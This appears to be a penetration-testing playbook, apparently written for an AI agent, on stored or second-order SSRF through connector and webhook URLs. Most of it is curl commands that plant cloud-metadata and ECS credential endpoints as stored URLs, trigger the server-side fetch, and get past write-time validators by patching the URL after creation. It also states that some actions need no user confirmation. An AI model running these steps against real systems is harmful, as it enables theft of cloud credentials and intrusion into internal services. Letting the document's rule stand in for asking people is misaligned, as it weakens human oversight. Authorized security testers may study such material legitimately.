# SSRF — Stored Connector / Webhook URL (Second-Order)

## When this applies

- The app lets you **create or update a resource** that holds a user-supplied URL: `base_url`, `api_url`, `instance_url`, `auth_url`, `endpoint`, `webhook_url`.
- The server does not fetch that URL on submission — it **stores** it, then fetches it later during a separate action: "Test connection", credential validation, a sync/refresh job, or the first time the connector is used.
- This is a **stored / second-order SSRF sink**: write now, fetch later, often from a different code path than the create handler. Distinct from the immediate passive-fetch framing in `localhost-and-ip-bypass.md` — there the URL is fetched inline on submit; here the dangerous fetch is decoupled from the request you control. For literal-localhost / private-IP encoding once you reach a fetch, fall back to `localhost-and-ip-bypass.md`.

## Technique

Create the resource with the stored URL pointing at an internal target, then **trigger** the deferred server-side fetch. Creating a connector in your own org/tenant and deleting it afterward is a reversible, non-destructive own-scope action — see `skills/coordination/reference/principles.md` (engagement principles; create-then-delete in your own scope is not a destructive operation and needs no AskUser).

Point the stored URL at one of:

- `http://169.254.170.2/v2/credentials/` — ECS task-role credentials (relative-path AWS creds; reachable with a plain GET, no metadata header). The single highest-value target when the app runs on ECS/Fargate, since a plain stored-URL GET returns the full credential JSON.
- `http://169.254.169.254/` — cloud metadata. IMDSv2 may block with a **timeout** rather than a 200 — the timeout itself is signal that the host can reach link-local but the metadata service refused the unauthenticated GET. On IMDSv1 hosts, walk straight to `/latest/meta-data/iam/security-credentials/`.
- `http://localhost:<port>/` or an internal service name — when the connector fetch runs inside the cluster, reach sidecars, admin ports, or `kubernetes.default.svc`. Combine with the encoding tricks in `localhost-and-ip-bypass.md` if a write-time validator blocks literal `localhost`.
- A Burp Collaborator / interactsh OOB host — proves the server-side fetch fires and reveals the egress IP even when the response body is never reflected.

Then fire the trigger: save → "Test connection" → sync → refresh.

## Steps

### Spot the stored sink

Before exploiting, confirm the URL is stored-then-fetched rather than fetched-on-submit:

- Grep the API surface for create/update bodies carrying a URL field: `base_url`, `api_url`, `instance_url`, `auth_url`, `endpoint`, `webhook_url`, `callback_url`, `server`.
- A separate verb/endpoint named `test`, `validate`, `verify`, `check`, `sync`, `refresh`, or `connect` against the same resource id is the tell — that is the deferred fetch.
- If create returns instantly with no fetch latency but `test` hangs ~timeout-length, the fetch lives in the trigger path. That decoupling is the whole point of this scenario.

### Exploit

```bash
# 1. CREATE the connector with the stored URL pointed at an internal target
#    (own-org / own-tenant resource — reversible, delete it in cleanup)
curl -s -X POST https://target/api/connectors \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"name":"probe","base_url":"http://169.254.170.2/v2/credentials/","api_key":"x"}'
# → note the returned id, e.g. {"id":"<RESOURCE_ID>"}

# 2. TRIGGER the deferred fetch — the "test connection" / validate path
curl -s -X POST https://target/api/connectors/<RESOURCE_ID>/test \
  -H "Authorization: Bearer $TOKEN"

# alternate triggers if there is no explicit test endpoint:
curl -s -X POST https://target/api/connectors/<RESOURCE_ID>/sync    -H "Authorization: Bearer $TOKEN"
curl -s     https://target/api/connectors/<RESOURCE_ID>/refresh -H "Authorization: Bearer $TOKEN"
```

### Validator-fails-open-at-use

Two distinct fail-open patterns make this reliable:

- **Validation at write, not at use.** If the create handler rejects `169.254.x.x` / `localhost`, retry the **trigger / sync path** with the stored value — many validators check the URL only on write and re-fetch the stored value later **without re-validating**. Set a benign `base_url` (`http://example.com/`) to pass the create check, then `PATCH` the resource to the metadata IP and call `/test` — the update path frequently skips the validator the create path ran.

```bash
# create with a clean URL to pass write-time validation
curl -s -X POST https://target/api/connectors -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"name":"probe","base_url":"http://example.com/"}'
# then swap the stored URL via update (often un-revalidated) and trigger the fetch
curl -s -X PATCH https://target/api/connectors/<RESOURCE_ID> -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"base_url":"http://169.254.170.2/v2/credentials/"}'
curl -s -X POST  https://target/api/connectors/<RESOURCE_ID>/test -H "Authorization: Bearer $TOKEN"
```

- **Validator accepts any HTTP 200 as "valid upstream".** A vendor "test connection" that calls the URL and treats **any** 200 as a healthy connector lets you persist an **active** connector pointing anywhere internal. Point it at a Collaborator host (returns 200), let it save as "verified", and you have a durable SSRF primitive re-fired on every sync.

## Verifying success

- **Collaborator / interactsh**: a DNS lookup **and** an HTTP request land on your OOB host within seconds of the trigger, sourced from the target's egress IP — not your own.
- **Credential / metadata leak**: the connection-test **result or error message** echoes the fetched body — ECS creds JSON (`AccessKeyId`/`SecretAccessKey`/`Token`) from `169.254.170.2`, or metadata content from `169.254.169.254`. A verbose "upstream returned: …" error is the usual exfil channel for blind sinks.
- **Timing**: an outbound request leaves the server within seconds of the trigger; an IMDSv2 **timeout** on `169.254.169.254` (vs an instant connection-refused) proves the host can route to link-local even when the body never returns.

## Common pitfalls

- **Cleanup**: delete the created connector (`DELETE /api/connectors/<RESOURCE_ID>`) — leaving an active connector pointed at internal infra is itself a change to target state.
- **Egress allowlists**: a hard egress firewall blocks 169.254.x.x entirely → connection-refused, not timeout. Pivot the stored URL to a Collaborator host to confirm whether *any* outbound is allowed before concluding the sink is dead.
- **IMDSv2 timeout vs true block**: a timeout means the packet reached the metadata service and it withheld the unauthenticated response (reachability proven — pivot to `169.254.170.2` ECS creds or header-injection for the PUT token). An instant connection-refused / DNS failure means egress is filtered (sink unreachable). Don't conflate the two.
- **Trigger lag**: sync may run on a schedule rather than on demand — watch the OOB host for a delayed hit before declaring the sink inert.

## Tools

- curl (create + trigger)
- Burp Suite Repeater (replay create / test / patch sequence)
- Burp Collaborator / interactsh (OOB DNS+HTTP confirmation, egress-IP capture)

## Risk

Creating and triggering a connector in your own org/tenant is reversible and non-destructive — delete it in cleanup. Do not point a persisted connector at third-party or out-of-scope hosts, and do not leave a "verified" connector live after the test.
